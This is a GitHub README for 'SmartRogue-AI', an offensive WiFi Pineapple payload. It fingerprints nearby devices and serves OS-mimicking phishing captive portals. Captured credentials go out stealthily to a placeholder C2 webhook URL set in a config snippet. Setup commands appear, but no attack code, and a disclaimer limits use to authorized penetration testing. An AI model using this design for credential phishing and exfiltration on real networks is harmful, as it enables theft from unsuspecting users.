<div align="center">

# 📡 SmartRogue-AI
### ⚡ *The Next Evolution of Adaptive Rogue Access Points* ⚡

[![Version](https://img.shields.io/badge/Version-1.0.0--Beta-blueviolet?style=for-the-badge)](https://github.com/)
[![Platform](https://img.shields.io/badge/Platform-WiFi%20Pineapple%20Pager-orange?style=for-the-badge)](https://hak5.org)
[![License](https://img.shields.io/badge/License-Authorized%20Only-red?style=for-the-badge)](https://github.com/)
[![Language](https://img.shields.io/badge/Python-3.9+-yellow?style=for-the-badge)](https://python.org)

<p align="center">
  <strong>A dynamic, context-aware payload that analyzes the airwaves to deliver the perfect deception.</strong>
</p>

---

<img src="https://img.shields.io/badge/Status-Operational-success?style=flat-square" />
<img src="https://img.shields.io/badge/Target-iOS%20%7C%20Android%20%7C%20Windows%20%7C%20macOS-lightgrey?style=flat-square" />
<img src="https://img.shields.io/badge/Category-Social%20Engineering-blue?style=flat-square" />

</div>

<br/>

## 🌌 Overview

**SmartRogue-AI** is not just another Rogue AP. It is an intelligent ecosystem designed for the **WiFi Pineapple Pager** that eliminates the "one-size-fits-all" approach to captive portals. 

By passively sniffing **802.11 management frames** and **Probe Requests**, the system identifies the exact operating system of a target device *before they even connect*. Once the OS is identified, it dynamically serves a captive portal meticulously crafted to match that device's native system UI, drastically increasing the probability of successful interaction.

---

## 🚀 Core Capabilities

### 🧠 1. Real-Time Fingerprinting
The engine doesn't rely on simple MAC lookups. It performs deep analysis of:
- **OUI (Organizationally Unique Identifier)**: Initial vendor identification.
- **IEEE 802.11 Information Elements (IEs)**: Analysis of supported rates, HT/VHT capabilities, and vendor-specific tags.
- **Probe Request Patterns**: Heuristic analysis of how different OS stacks announce themselves.

### 🎭 2. Dynamic UI Orchestration
Once a device is flagged (e.g., as `iOS`), the **Portal Thread** instantly maps the session to the corresponding template:
- **iOS** $\rightarrow$ Apple-styled "Join Network" portal.
- **Android** $\rightarrow$ Google-styled account authentication.
- **Windows/macOS** $\rightarrow$ OS-native system prompts.

### 🛡️ 3. Stealthy Exfiltration
Data is collected and offloaded asynchronously via **encrypted webhooks**, ensuring the payload remains lightweight and the attacker remains invisible.

---

## 🛠️ Technical Architecture

### 🏗️ System Flow
1. **`payload.sh`** $\rightarrow$ Hardens the OS $\rightarrow$ Sets Monitor Mode $\rightarrow$ Launches DHCP.
2. **`engine.py`** $\rightarrow$ Spawns 4 concurrent threads (Sniffer $\rightarrow$ Analysis $\rightarrow$ Portal $\rightarrow$ Exfil).
3. **`fingerprint.py`** $\rightarrow$ Processes raw frames $\rightarrow$ Returns OS Tag.
4. **`portal.py`** $\rightarrow$ Fetches template $\rightarrow$ Serves tailored HTML.

### 📂 Directory Map
```bash
SmartRogue-AI/
├── core/
│   ├── engine.py        # The "Brain" - Thread Management
│   ├── fingerprint.py  # The "Eye" - Packet Analysis
│   └── portal.py       # The "Face" - Template Mapping
├── web/
│   └── templates/      # The "Masks" - OS-Specific UIs
├── config.yaml        # The "Heart" - Central Settings
└── payload.sh          # The "Key" - Bootstrap Script
```

---

## ⚡ Quick Start

### 📥 Installation
```bash
git clone https://github.com/your-repo/SmartRogue-AI.git
cd SmartRogue-AI
chmod +x payload.sh
```

### ⚙️ Configuration
Edit `config.yaml` to point to your command-and-control (C2) webhook:
```yaml
exfiltration:
  webhook_url: "https://your-c2-server.com/api/collect"
```

### 🚩 Execution
```bash
sudo ./payload.sh
```

---

## ⚠️ Legal & Ethical Boundary

<div align="center">
  <table width="100%" border="0" cellspacing="0" cellpadding="15">
    <tr>
      <td bgcolor="#fff5f5" style="border: 2px solid #ff0000; border-radius: 10px;">
        <h3 align="center" style="color: #ff0000; margin-top: 0;">🚨 WARNING 🚨</h3>
        <p align="center" style="color: #333; font-size: 14px;">
          This tool is developed exclusively for <strong>Authorized Penetration Testing</strong>, 
          <strong>Security Audits</strong>, and <strong>Academic Research</strong>. 
          Unauthorized use of this tool against any network or device is strictly prohibited and may 
          be illegal. The creators hold no responsibility for any misuse of this software.
        </p>
      </td>
    </tr>
  </table>
</div>

<br/>

<div align="center">
  <p>Designed for the <strong>Hak5 Yearly Payload Awards</strong> 🏆</p>
  <p><i>"Adaptive Deception. Precision Targeting."</i></p>
</div>
